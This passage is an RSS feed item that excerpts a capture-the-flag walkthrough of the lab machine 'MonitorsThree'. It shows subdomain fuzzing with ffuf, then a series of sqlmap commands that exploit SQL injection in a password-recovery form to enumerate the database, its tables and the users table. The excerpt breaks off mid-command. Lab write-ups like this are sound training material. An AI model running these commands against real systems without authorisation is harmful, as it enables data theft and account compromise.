channel.title: Medium on Prickly Phish writeups
channel.description: Recent content in Medium on Prickly Phish writeups

item.title: MonitorsThree
item.description: monitorsthree # User # sudo bash -c "echo '10.10.11.30 monitorsthree.htb'>> /etc/hosts" Can’t see anything of interest off the bat lets do some enumeration ffuf -u http://monitorsthree.htb -H "Host:FUZZ.monitorsthree.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -c -ac Found the app login section The password recovery section was vulnerable to sql injection sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --dbs sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --level=5 --risk=3 -D monitorsthree_db --tables sqlmap -u monitorsthree.htb/forgot_password.php --forms --crawl=2 --level=5 --risk=3 -D monitorsthree_db -T users -columns sqlmap -u monitorsthree.
